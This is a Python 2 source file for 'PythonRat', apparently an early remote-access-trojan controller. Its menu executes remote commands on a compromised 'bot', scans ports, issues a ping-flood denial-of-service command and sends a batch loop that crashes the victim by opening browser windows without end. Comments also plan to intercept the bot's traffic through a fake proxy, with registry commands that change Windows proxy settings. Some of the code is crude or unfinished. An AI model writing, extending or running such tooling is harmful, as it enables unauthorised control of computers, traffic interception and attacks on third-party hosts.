#!/usr/bin/python           # bot manager for pyRat
import sys
import os
import socket               # RECODE for CMD windows then Terminal

       
def main():
	msg=""
	

#f = open('bots.txt', 'r')


# IMPORTANT make bot redirect to my own proxy and get all traffic with fake proxy server mitm

#Command to enable proxy usage:

#reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" ^
  #  /v ProxyEnable /t REG_DWORD /d 1 /f

#Command to disable proxy usage:

#reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" ^
 #   /v ProxyEnable /t REG_DWORD /d 0 /f

#Command to change the proxy address:

#reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" ^
 #   /v ProxyServer /t REG_SZ /d proxyserveraddress:proxyport /f

#
#
#
	

#with open("bots.txt", "r") as ins:  salvataggio bot,caricamento bot da file o sito ... dyndns
 #   array = []
 #   for line in ins:
  #      array.append(line)
     
#while 
#print (array[i])
#print f.read()

## select bot prima poi options
	scelta=raw_input("Select an option from the menu(enter 'exit' to go back to the menu): \n1) Remote command execution (CMD or Terminal)\n2) Bot lookup General infos\n3) Port Scanning\n4) Use Bot as VPN (implementing...)\n5) Keylogging (still not implemented) \n6) Use bot as booter\dosser\n7) Drop connection & Exit \n8) Crash bot(CMD)\n")
	if scelta == "1" :
		print "Insert 'exit' to quit the command exec mode"
		while (msg!="exit"):
			s = socket.socket()         
			host = socket.gethostname() # Get local machine name
			port = 2346
			s.connect((host, port))
			msg=raw_input("Host: "+host +" >> ")
			s.send(msg)
			out=s.recv(1024)
			out_file = open("log.txt","a")
			out_file.write(out)
			out_file.close()
			print "reply from bot: "+out
		s.close()
			
	if scelta == "2" : ##EXEC IF CONFIG REMOTE THEN GET ALL OUTPUT AND SEND IT TO pyRat
							## EXEC USERS .. GET USER INFO ON THE SYSTEM
								##lspci,lscpu,ls -, GET all info about files\folders and a tree of all filesystem(unix & windows)
								##
			print "\n\n -------------------PING TEST-------------------\n\n"
			os.system("ping -c 1 " + bot)
			os.system("tracert " + bot)
			print "\n\n -------------------DNS TEST-------------------\n\n"
			os.system("nslookup "+bot)
			print "\n\n -------------------END TESTING-------------------\n\n"
			raw_input("Press Enter to continue...")
			
			
	if scelta == "3" :
			s = socket.socket()         # Create a socket object
			host = socket.gethostname() # Get local machine name
			i=0
			while (i<=1024): 
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				result = s.connect_ex((bot, i))
				i=i+1
				if result == 0:
					print "Port open --> "+str(i)
			raw_input("Press Enter to continue...")
			
	if scelta == "6" : ## addm ore features syn flood other cmds 
		print "PING Flood active\n"
		target=raw_input("Insert target to flood :")
		s = socket.socket()         
		host = socket.gethostname() 
		port = 12345 
		s.connect((host, port))
		s.send("ping "+target)
		out=s.recv(1024)+""
		print "raw reply from remote bot: "+out
		raw_input("Press Enter to continue...")
	    

		
					
			
	if scelta == "7" :
		
			sys.exit()
	if scelta == "8" :
			s = socket.socket()         
			host = socket.gethostname() 
			port = 2345 
			s.connect((host, port))
			fork=""""@echo off 
			:1 start iexplore.exe 
			goto 1"""
			s.send(fork)
			out_file = open("log.txt","a")
			out_file.write(fork)
			out_file.close()
			s.close()
			raw_input("Press Enter to continue...")
		 
			
			
	
print """ 

                                                                  
|`````````, ``..     ..'' |`````````,       .'.       `````|````` 
|'''''''''      ``.''     |'''|'''''      .''```.          |      
|                 |       |    `.       .'       `.        |      
|                 |       |      `.   .'           `.      |      

************************************************************
PythonRat                                                                
coded by S4mick // alpha 0.1 single-bot mode"""   
bot=raw_input("Insert Bot ip: \n")
if bot =="": bot="127.0.0.1"
while 1: 
	os.system("cls")			
	main()
	
	

		
		
		
		
		
		
		
		
		
		
		
		
		
                 # Close the socket when done
